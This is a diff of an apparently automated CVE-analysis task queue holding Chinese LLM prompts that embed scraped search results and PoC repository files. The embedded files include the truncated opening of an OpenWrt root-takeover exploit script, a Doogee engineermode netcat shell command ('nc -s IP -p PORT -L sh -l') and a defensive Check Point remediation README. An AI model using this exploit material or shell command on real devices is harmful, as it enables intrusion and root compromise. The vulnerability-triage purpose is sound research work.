\"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 2,
+    "retry_count": 3,
     "max_retries": 5,
     "priority": 2,
     "status": "processing",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1781800643.5964067,
-    "last_attempt": 1781820816.2785633,
-    "next_attempt": 1781820834.9267921,
+    "last_attempt": 1781850205.1495697,
+    "next_attempt": 1781850243.2756753,
     "metadata": {},
     "task_id": "task_CVE-2026-46215_1781800643",
     "required_result_fields": [
@@ -2003,15 +2003,15 @@
   {
     "cve_id": "CVE-2026-46368",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-46368\", \"sources\": [\"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: luci-app-https-dns-proxy\\u547d\\u4ee4\\u6ce8\\u5165\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-46368 : Command Injection Vulnerability in...\n [description] Exploit Exists Public PoC. What is CVE-2026-46368? The luci-app-https-dns-proxy, an optional add-on for OpenWrt, is susceptible to a command injection flaw within its setInitAction function.\n [link] https://securityvulnerability.io/vulnerability/CVE-2026-46368\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-46368 - luci-app-https-dns-proxy Authenticated Command...\n [description] CVE-2026-46368. luci-app-https-dns-proxy Authenticated Command Injection via setInitAction. Overview. Vulnerability Timeline.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-46368\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-46368 - CVE-2026-46368 Vulnerability... | WatchStack.io\n [description] CVE-2026-46368 Exploits & PoCs (Proof Of Concept). No public PoCs found in our database for this CVE. May 26, 2026 MODIFIED. Vulnerability data updated via NVD.\n [link] https://watchstack.io/intel/cve/CVE-2026-46368\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-46368 — Luci-App-Https-Dns-Proxy | dbugs\n [description] Details on CVE-2026-46368: Luci-App-Https-Dns-Proxy. Exploited in the wild. Includes CVSS score, affected versions, and references.\n [link] https://dbugs.ptsecurity.com/vulnerability/PT-2026-43259\n [webpage 3 end]\n[webpage 4 begin] [title] PT-2026-46368 - vulnerability database | Vulners.com\n [description] PT-2026-46368. 04 Jun 2026 00:00:00Reported by Positive TechnologiesType. Build on a solid foundation with Vulners data. We provide the essential building blocks for cybersecurity solutions with comprehensive, structured, and constantly updated vulne...\n [link] https://vulners.com/ptsecurity/PT-2026-46368\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/7cba9598aad4ff27516a682d5b5825b6/README.md\n---\n# OpenWrt luci-app-https-dns-proxy Authenticated Command Injection (CVE-2026-46368)\n\nThis repository contains the Proof of Concept (PoC) exploit for a critical OS command injection vulnerability in `luci-app-https-dns-proxy` that results in arbitrary command execution as **root**.\n\n- **CVE ID:** CVE-2026-46368\n- **Exploit-DB:** [EDB-52521](https://www.exploit-db.com/exploits/52521)\n- **CVSS:** 8.8 (v3.1) / 8.7 (v4.0) — **High**\n- **CWE:** CWE-77 (Improper Neutralization of Special Elements used in a Command)\n\n## Vulnerability Details\n- **Vendor:** OpenWrt community package (maintainer: mossdef-org / stangri)\n- **Product:** luci-app-https-dns-proxy — optional LuCI web UI add-on for the `https-dns-proxy` package, distributed through the OpenWrt community packages feed (not installed by default)\n- **Affected versions:** through `2025.12.29-5`\n- **Affected component:** `setInitAction` in the `luci.https-dns-proxy` ubus RPC handler (`/usr/libexec/rpcd/luci.https-dns-proxy`)\n- **Impact:** An authenticated user holding the `luci.https-dns-proxy` ACL permission can inject shell metacharacters through the `name` parameter of the `luci.https-dns-proxy setInitAction` ubus RPC call, resulting in arbitrary command execution as **root** on the underlying device.\n\n## Description\nThe `setInitAction` RPC method passes a user-supplied value to the system shell without proper sanitization. An authenticated LuCI user can therefore inject arbitrary shell metacharacters through the `name` parameter and execute commands with root privileges.\n\n## Usage\n```bash\npython3 exploit.py\n```\n\n![Exploit Screenshot](exploit_success_screenshot.png)\n\n## Author & Credit\nThis vulnerability and Proof-of-Concept are the **original work of Ahmet Mersin**, discovered and reported by the author. Please retain attribution on any reuse or republication.\n\n- **Author:** Ahmet Mersin\n- **Website:** https://ahmetmersin.com\n- **GitHub:** https://github.com/iwallplace\n- **HackerOne:** https://hackerone.com/iwallplace\n- **Exploit-DB:** [EDB-52521](https://www.exploit-db.com/exploits/52521) (Author: Ahmet Mersin)\n- **Contact:** hestiases@gmail.com\n\n## Disclosure\nDiscovered and reported by [@iwallplace](https://github.com/iwallplace). Users are advised to update `luci-app-https-dns-proxy` to a fixed release.\n\n## References\n- CVE Record: https://www.cve.org/CVERecord?id=CVE-2026-46368\n- Exploit-DB: https://www.exploit-db.com/exploits/52521\n\n\n---\n/tmp/7cba9598aad4ff27516a682d5b5825b6/exploit.py\n---\n#!/usr/bin/env python3\n# Exploit Title: OpenWrt luci-app-https-dns-proxy - Authenticated Remote Code Execution (RCE)\n# Date: 2026-01-17\n# Exploit Author: Ahmet Mersin\n# Author Website: https://ahmetmersin.com\n# Author GitHub: https://github.com/iwallplace\n# Author HackerOne: https://hackerone.com/iwallplace\n# Author Contact: hestiases@gmail.com\n# PoC Repository: https://github.com/iwallplace/CVE-2026-46368-OpenWrt-Exploit\n# Vendor Homepage: https://github.com/stangri/luci-app-https-dns-proxy\n# Software Link: https://github.com/stangri/luci-app-https-dns-proxy\n# Version: All versions prior to 2026-01-17\n# Tested on: OpenWrt 23.05\n# CVE : CVE-2026-46368\n\n\"\"\"\nOpenWrt luci-app-https-dns-proxy Root Takeover Exploit\nCVE-2026-46368 - Local Privilege Escalation via Command Injection\n\nAuthor : Ahmet Mersin  <https://ahmetmersin.com>\nGitHub : https://github.com/iwallplace  (PoC repo: CVE-2026-46368-OpenWrt-Exploit)\n\nThis Proof-of-Concept is the original work of Ahmet Mersin, discovered and\nreported by the author. Credit must be retained on any reuse or republication.\n\"\"\"\n\nimport requests\nimport sys\nimport getpass\n\ndef banner():\n    print(\"\"\"\n╔═══════════════════════════════════════════════════════════════╗\n║   OpenWrt https-dns-proxy Root Takeover Exploit               ║\n║   CVE-2026-46368 | Privilege Escalation via Command Injection ║\n║                                                               ║\n║   Developed by: ahmetmersin.com                               ║\n╚═══════════════════════════════════════════════════════════════╝\n   Author : Ahmet Mersin  |  ahmetmersin.com  |  github.com/iwallplace\n   CVE-2026-46368  |  EDB-52521\n    \"\"\")\n\ndef get_user_input():\n    print(\"[*] Target Router Information:\")\n    target_ip = input(\"    Router IP [192.168.1.1]: \").strip() or \"192.168.1.1\"\n    \n    print(\"\\n[*] Limited User Credentials (user with https-dns-proxy ACL):\")\n    username = input(\"    Username: \").strip()\n    if not username:\n        print(\"[-] Username cannot be empty!\")\n        sys.exit(1)\n    password = getpass.getpass(\"    Password: \")\n    if not password:\n        print(\"[-] Password cannot be empty!\")\n        sys.exit(1)\n    \n    print(\"\\n[*] New Root Password:\")\n    new_root_pass = getpass.getpass(\"    Enter new root password: \")\n    if not new_root_pass:\n        print(\"[-] Password cannot be empty!\")\n        sys.exit(1)\n    \n    confirm_pass = getpass.getpass(\"    Confirm new root password: \")\n    \n    if new_root_p\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 1,
+    "retry_count": 2,
     "max_retries": 5,
     "priority": 2,
-    "status": "processing",
+    "status": "pending",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1781811095.064364,
-    "last_attempt": 1781820685.236676,
-    "next_attempt": 1781820695.3207493,
+    "last_attempt": 1781850203.904566,
+    "next_attempt": 1781850223.619531,
     "metadata": {},
     "task_id": "task_CVE-2026-46368_1781811095",
     "required_result_fields": [
@@ -2030,46 +2030,17 @@
     ]
   },
   {
-    "cve_id": "CVE-2025-31710",
-    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-31710\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"In engineermode service, there is a possible command injection due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed.\", \"\\u6807\\u9898: google android-15.0 CVE-2025-31710\\u6f0f\\u6d1e\"], \"published_date\": \"2025-06-03T06:15:27.310\", \"last_modified_date\": \"2026-06-17T09:10:48.770\", \"cvss_score\": 5.9, \"severity\": \"MEDIUM\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"u\", \"n\", \"i\", \"s\", \"o\", \"c\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"_\", \"u\", \"s\", \"/\", \"s\", \"e\", \"c\", \"y\", \"/\", \"a\", \"n\", \"n\", \"o\", \"u\", \"n\", \"c\", \"e\", \"m\", \"e\", \"n\", \"t\", \"D\", \"e\", \"t\", \"a\", \"i\", \"l\", \"/\", \"1\", \"9\", \"2\", \"9\", \"7\", \"7\", \"3\", \"7\", \"6\", \"3\", \"3\", \"1\", \"4\", \"9\", \"0\", \"9\", \"1\", \"8\", \"6\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] data-cve-poc/2025/CVE-2025-31710 at main · XiaomingX/data-cve-poc - GitHub\n [description] CVE-2025-31710 Folders and files ... README.md unisoc-su A method for CVE-2025-31710 and to connect to cmd_skt abstract socket to obtain a root shell on unisoc unpatched devices Before everyone screams, Unisoc itself authorized me to publish this after CVE-2025-31710 bullettin, so stay quiet. Let's start with a joke Yes, you are not dreaming.\n [link] https://github.com/XiaomingX/data-cve-poc/tree/main/2025/CVE-2025-31710\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - mpn/cve-list-poc: Latest CVEs with their Proof of Concept ...\n [description] Latest CVEs with their Proof of Concept exploits. Contribute to mpn/cve-list-poc development by creating an account on GitHub.\n [link] https://github.com/mpn/cve-list-poc\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2025-31710 - Cisco Engineermode Command Injection Vulnerability\n [description] Common Attack Pattern Enumeration and Classification (CAPEC) stores attack patterns, which are descriptions of the common attributes and approaches employed by adversaries to exploit the CVE-2025-31710 weaknesses.\n [link] https://cvefeed.io/vuln/detail/CVE-2025-31710\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2025-31710 Security Vulnerability & Exploit Details\n [description] CVE-2025-31710 Vulnerability Summary CVE-2025-31710: In engineermode service, there is a possible command injection due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed.\n [link] https://cve.akaoma.com/cve-2025-31710\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2025-31710 Impact, Exploitability, and Mitigation Steps | Wiz\n [description] Understand the critical aspects of CVE-2025-31710 with a detailed vulnerability assessment, exploitation potential, affected technologies, and remediation guidance.\n [link] https://www.wiz.io/vulnerability-database/cve/cve-2025-31710\n [webpage 4 end]\n[webpage 5 begin] [title] GitHub - LNEYYY/POC-2025: 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，长期更新。\n [description] 收集整理漏洞EXP/POC,大部分漏洞来源网络，目前收集整理了1400多个poc/exp，善用CTRL+F搜索 · 感谢以下贡献者为本项目做出的贡献，同时也欢迎各位师傅提交PR/issues共同维护：\n [link] https://github.com/LNEYYY/POC-2025\n [webpage 5 end]\n[webpage 6 begin] [title] GitHub - Threekiii/Awesome-POC: 一个漏洞 PoC 知识库。A knowledge base for vulnerability PoCs(Proof of Concept), with 1k+ vulnerabilities.\n [description] 一个漏洞 PoC 知识库。A knowledge base for vulnerability PoCs(Proof of Concept), with 1k+ vulnerabilities. - Threekiii/Awesome-POC\n [link] https://github.com/Threekiii/Awesome-POC\n [webpage 6 end]\n[webpage 7 begin] [title] GitHub - Threekiii/CVE: 一个 CVE 漏洞预警知识库，无 exp/poc，部分包含修复方案。A knowledge base of CVE security vulnerability, no PoCs/exploits.\n [description] 一个 CVE 漏洞预警知识库，无 exp/poc，部分包含修复方案。A knowledge base of CVE security vulnerability, no PoCs/exploits. - Threekiii/CVE\n [link] https://github.com/Threekiii/CVE\n [webpage 7 end]\n[webpage 8 begin] [title] GitHub - 0xMarcio/cve: Latest CVEs with their Proof of Concept exploits. · GitHub\n [description] Latest CVEs with their Proof of Concept exploits. Contribute to 0xMarcio/cve development by creating an account on GitHub.\n [link] https://github.com/0xMarcio/cve\n [webpage 8 end]\n[webpage 9 begin] [title] Vulnerability Summary for the Week of December 1, 2025 | CISA\n [description] Vulnerabilities are based on the Common Vulnerabilities and Exposures (CVE) vulnerability naming standard and are organized according to severity, determined by the Common Vulnerability Scoring System (CVSS) standard.\n [link] https://www.cisa.gov/news-events/bulletins/sb25-342\n [webpage 9 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/a8ae6cac0c7cc9e5a6e1eb3a2d70f9a2/CVE-2025-67264.md\n---\nCVE-2025-67264\n\nThis is another case where Doogee here on their unisoc units on com.sprd.engineermode on Android 15 forgot to remove the Adb shell activity. We have 3 models impacted, listed above with the fingerprints, because them use the same exact apk (same shasum aeb125dfb4c64d919c60364fc75a23f94ddfece5), them are running on Android 15 which should be patched, as unisoc removed the Adb shell activity on Android 14 and have tool_service of course but both the boot image and engineermode report as them are running android 13, the size of engineermode is 9MB so it is the patched version however they probably used the Android 13 vndk and built the stock system as a pseudo gsi or i don't know, the result is that they reintroduced [this](https://nvd.nist.gov/vuln/detail/CVE-2025-31710) vulnerability, the app on these models has the Adb shell activity and allows a reverse shell, but it is not system, so it is not possible to run the com.sammy.systools libs as binaries, source scripts or browse /sdcard, however, on the command for the reverse shell you can change the IP address to 0.0.0.0 or input the IP of the phone instead of 127.0.0.1, and then you can connect from another device with the same phone IP assuming the device you are connecting from is on the same network as the phone.\nThe vulnerability works as explained on main readme and as showed on screenshots (i will hide the ip), you will have to insert on the Adb shell prompt \"nc -s IP -p PORT -L sh -l\" and press start, after opening it with adb shell on pc or root activity launcher, as this time the app doesn't require to be ran from the dialer, replacing IP and PORT accordingly, then connect from the terminal with \"nc IP PORT\".\n\n<img width=\"366\" height=\"848\" alt=\"RCE1\" src=\"https://github.com/user-attachments/assets/c2109d1d-d205-40cd-9175-fa0589fdca08\" /> <img width=\"757\" height=\"175\" alt=\"RCE2\" src=\"https://github.com/user-attachments/assets/0401e4ca-e80d-40c9-a059-09207d381bac\" />\n\nModels impacted\n\nDoogee Note59 Pro+\n\nDOOGEE/1929ST/1929ST:15/AP3A.240905.015.A2/20250402:user/release-keys\n\nDOOGEE/1929ST/1929ST:15/AP3A.240905.015.A2/20250910:user/release-keys\n\nDoogee Note59 Pro\n\nDOOGEE/1929SH_EEA/1929SH:15/AP3A.240905.015.A2/20250310:user/release-keys\n\nDoogee Note59\n\nDOOGEE/1929SC_EEA/1929SC:15/AP3A.240905.015.A2/20250226:user/release-keys\n\n\n---\n/tmp/a8ae6cac0c7cc9e5a6e1eb3a2d70f9a2/LICENSE\n---\n                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the softw\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 0,
-    "max_retries": 5,
-    "priority": 2,
-    "status": "pending",
-    "error_type": null,
-    "last_error": null,
-    "created_at": 1781820811.1516635,
-    "last_attempt": 0,
-    "next_attempt": 1781820816.0739052,
-    "metadata": {},
-    "task_id": "task_CVE-2025-31710_1781820811",
-    "required_result_fields": [
-      "poc_available",
-      "condition",
-      "fix",
-      "risk_level",
-      "summary",
-      "attack_vector",
-      "affected_component",
-      "poison",
-      "markdown",
-      "repo_name",
-      "repo_url",
-      "cve_url"
-    ]
-  },
-  {
     "cve_id": "CVE-2026-50751",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-50751\", \"sources\": [\"CISA\", \"OSCS\"], \"descriptions\": [\"\\u6807\\u9898: Check Point VPN IKEv1 \\u8ba4\\u8bc1\\u7ed5\\u8fc7\\u6f0f\\u6d1e\"], \"published_date\": null, \"last_modified_date\": null, \"cvss_score\": null, \"severity\": null, \"references\": []}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] nomi-sec/PoC-in-GitHub\n [description] This vulnerability allows remote attackers to execute arbitrary code on affected installations of Langflow. Authentication is not required to exploit this ...\n [link] https://github.com/nomi-sec/PoC-in-GitHub\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2018-11776 Apache Struts versions 2.3 to 2.3.34 and 2.5…\n [description] Aug 22, 2018 · This Metasploit module exploits a remote code execution vulnerability in Apache Struts versions 23 through 234, and 25 through 2516 Remote code ...\n [link] https://vulmon.com/vulnerabilitydetails?qid=CVE-2018-11776\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2021-22205 An issue has been discovered in GitLab CE/EE…\n [description] Apr 23, 2021 · This Metasploit module exploits an unauthenticated file upload and command injection vulnerability in GitLab Community Edition (CE) and ...\n [link] https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-22205\n [webpage 2 end]\n[webpage 3 begin] [title] Researchers release details, PoC for exploited Check Point VPN flaw (CVE-2026-50751) - Help Net Security\n [description] 1 week ago - WatchTowr researchers have disclosed a technical analysis and PoC exploit for an actively exploited Check Point VPN flaw (CVE-2026-50751).\n [link] https://www.helpnetsecurity.com/2026/06/12/cve-2026-50751-poc-exploit/\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-50751 - Check Point Security Gateway Improper Authentication Vulnerability - [Actively Exploited]\n [description] 1 week ago - The Common Vulnerability Scoring System is a standardized framework for assessing the severity of vulnerabilities in software and systems. We collect and displays CVSS scores from various sources for each CVE. Disable deprecated IKEv1 and enforce IKEv2 for VPN connections to prevent authentication bypass. Disable IKEv1 on all VPN gateways. Enforce IKEv2 for all VPN connections. Update VPN client configurations. CVE-2026-50751 has a 4 public PoC/Exploit available at Github.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-50751\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/649edd9e9f52f834748b352a2535059d/README.md\n---\n# CVE Web Check\n\nAn approval-based local webapp for scanning and remediating potential Check Point CVE-2026-50751 and CVE-2026-50752 exposure with trusted Check Point Management API commands.\n\nThis tool is not created or supported by Check Point and should be used at your own risk. Remediation is temporary. Check Point recommends patching quickly using the patches provided for each CVE in the [Check Point Security Advisories](https://support.checkpoint.com/security-advisories).\n\nThe app runs locally, logs in to a Check Point Security Management Server or MDS, scans relevant VPN configuration, shows exactly where remediation may be needed, lets an operator approve the changes, applies the changes through the Management API, and can publish the management session. Policy still needs to be installed after publishing for the remediation changes to take effect on gateways.\n\n## What It Checks\n\n### IKE Version Global Property Scan and Remediate (CVE-2026-50751)\n\nScans the SMS global Remote Access VPN property:\n\n```text\nremote-access.vpn-authentication-and-encryption.encryption-method\n```\n\nIf the current value is not `ike_v2_only`, the app can approve and apply a change to set the property to:\n\n```text\nike_v2_only\n```\n\nThis scan is intended to identify exposure where deprecated IKEv1 key exchange is still globally allowed for VPN Remote Access and Mobile Access. IKEv1 is deprecated and no longer industry best practice. This change can affect older VPN clients. Review [SK166415](https://support.checkpoint.com/results/sk/sk166415) for additional Check Point guidance.\n\n### Legacy Client's Allowed Check Scan and Remediate (CVE-2026-50751)\n\nScans simple gateways and checks each gateway generic object for the VPN realm inside:\n\n```text\nrealmsForBlades\n```\n\nThe app reports whether legacy clients are supported or disabled. When remediation is approved, it sets the VPN realm owned-object `disabled` value to `true`.\n\nUser-facing result text:\n\n- `Legacy clients are disabled`\n- `Legacy Clients are Supported`\n\nAllowing legacy clients can preserve support for IKEv1, which is no longer an industry best practice. We recommend disabling this setting unless legacy clients are still required. If legacy clients are needed, plan to migrate them to a more secure modern VPN client.\n\n### Site-to-Site VPN Communities Scan and Remediate (CVE-2026-50752)\n\nScans both Check Point site-to-site VPN community types:\n\n- Star communities\n- Mesh communities\n\nThe app flags a VPN community only when all of these are observed:\n\n- VPN site-to-site is enabled.\n- The VPN community uses IKEv1.\n- Gateways participating in the VPN community use certificate-based authentication.\n\nFor Star communities, the app displays center gateways and satellite gateways separately. Gateway names are tagged as locally managed or externally managed when the API data provides enough object type information.\n\nFor Mesh communities, the app pulls gateway names from the community `gateways` list. Mesh communities do not include externally managed gateway handling in this tool, so that field is shown as not applicable.\n\nWhen remediation is approved, the app attempts to set the VPN community encryption method to IKEv2 only. Star communities use:\n\n```text\nset-vpn-community-star\n```\n\nMesh communities use:\n\n```text\nset-vpn-community-meshed\n```\n\nIf a selected Star community includes externally managed gateways, the app warns before applying the change. You must make sure the matching IKEv2-only change is also made on the externally managed gateway side.\n\n## Workflow\n\n1. Log in with a Check Point Management API user.\n2. Click **Scan Check Point Config**.\n3. Review the SMS global property, legacy client gateway findings, and site-to-site VPN community findings.\n4. Approve only the changes you want to apply.\n5. Click the matching apply button.\n6. Publish from the tool or uncheck **Publish after successful apply** if you want to inspect and publish manually.\n7. Install policy after publishing so gateway-side changes take effect.\n\n## Security Notes\n\n- The app defaults to HTTPS when connecting to the Check Point management server.\n- Do not enter the management server as `http://...`; that would send the Check Point API login over cleartext HTTP.\n- The browser talks to the local backend over 